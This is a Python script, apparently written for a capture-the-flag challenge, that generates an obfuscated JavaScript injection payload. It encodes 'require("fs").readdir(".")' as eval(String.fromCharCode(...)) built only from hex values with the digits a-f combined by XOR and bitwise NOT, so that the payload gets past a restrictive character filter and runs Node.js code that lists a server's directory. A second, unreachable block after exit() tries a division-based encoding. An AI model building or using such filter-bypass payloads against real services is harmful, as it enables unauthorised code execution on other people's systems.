to_craft = 'require("fs").readdir(".")'

corresp = {}
corresp2 = {}
corresp3 = {}
for i in to_craft:
    corresp[i] = 0
    corresp2[i] = 0
    corresp3[i] = 0

print(len(corresp))

granted = range(ord('a'),ord('f')+1)

for i in granted:
    for j in granted:
        for k in granted:
            for l in granted:
                if chr(int(chr(i)+chr(j),16)^int(chr(k)+chr(l),16)) in to_craft:
                    corresp[chr(int(chr(i)+chr(j),16)^int(chr(k)+chr(l),16))] = (chr(i)+chr(j),chr(k)+chr(l))

for i in granted:
    for j in granted:
        tmp = chr(i)+chr(j)
        a = int(tmp,16)
        if chr(~a&255) in to_craft:
            corresp2[chr(~a&255)] = chr(i)+chr(j)

for i in granted:
    for j in granted:
        for k in granted:
            for l in granted:
                for m in granted:
                    if chr(int(chr(i)+chr(j),16)^int(chr(k)+chr(l),16)^int(chr(m),16)) in to_craft:
                        corresp3[chr(int(chr(i)+chr(j),16)^int(chr(k)+chr(l),16)^int(chr(m),16))] = (chr(i)+chr(j),chr(k)+chr(l),chr(m))

print(corresp)
print(corresp2)
print(corresp3)

payload = "eval(String.fromCharCode("
for i in to_craft:
    granted = corresp2[i]
    print(i)
    if granted == 0:
        granted = corresp[i]
        if granted == 0:
            granted = corresp3[i]
            payload += "0x"+granted[0]+"^0x"+granted[1]+"^0x"+granted[2]+","
        else:
            payload += "0x"+granted[0]+"^0x"+granted[1]+","
    else:
        payload += "~0x"+granted+","


payload = payload[:-1]+"))"
print(payload)

exit()

for i in corresp:
    to_be_equal_to = ord(i)

    found = False
    cur_granted = chr(granted[0])+chr(granted[0])
    while not found:
        l = len(cur_granted)//2
        cur = (to_be_equal_to^int(cur_granted[-l:], 16))*int(cur_granted[:-l], 16)

        bad = False
        for j in hex(cur).replace('0x',''):
            if ord(j) not in granted:
                bad = True
                break

        if not bad:
            corresp[i] = cur_granted
            corresp2[i] = cur
            print("Found ! ("+hex(cur)+"/"+str(cur_granted[:-l])+") ^"+str(cur_granted[-l:]))
            found = True
            break


        k = len(cur_granted)-1
        while k>=0 and cur_granted[k] == chr(granted[len(granted)-1]):
            cur_granted = cur_granted[:k]+chr(granted[0])+cur_granted[k+1:]
            k -= 1

        if k<0:
            cur_granted = chr(granted[0])+cur_granted
        else:
            cur_granted = cur_granted[:k]+chr(granted[granted.index(ord(cur_granted[k]))+1])+cur_granted[k+1:]

print(corresp)

payload = "eval(String.fromCharCode("
for i in to_craft:
    print(i)
    granted = corresp[i]
    print(granted)
    l = len(granted)//2
    payload += hex(corresp2[i])+"/0x"+granted[:-l]+"^0x"+granted[-l:]+","

payload = payload[:-1]+"))"
print(payload)
